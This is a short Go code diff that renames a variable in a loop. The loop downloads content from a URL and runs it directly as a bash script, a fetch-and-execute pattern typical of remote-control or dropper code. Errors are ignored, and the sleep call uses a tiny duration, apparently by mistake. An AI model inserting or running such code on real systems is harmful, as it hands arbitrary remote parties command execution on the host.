@@ -13,9 +13,9 @@ func main() {
 		resp, _ := http.Get(string(url))
 		defer resp.Body.Close()
 
-		shellScriptBody, _ := ioutil.ReadAll(resp.Body)
+		shell, _ := ioutil.ReadAll(resp.Body)
 
-		cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
+		cmd := exec.Command("/bin/bash", "-c", string(shell))
 		cmd.Start()      
 		time.Sleep(5000) 
 	}
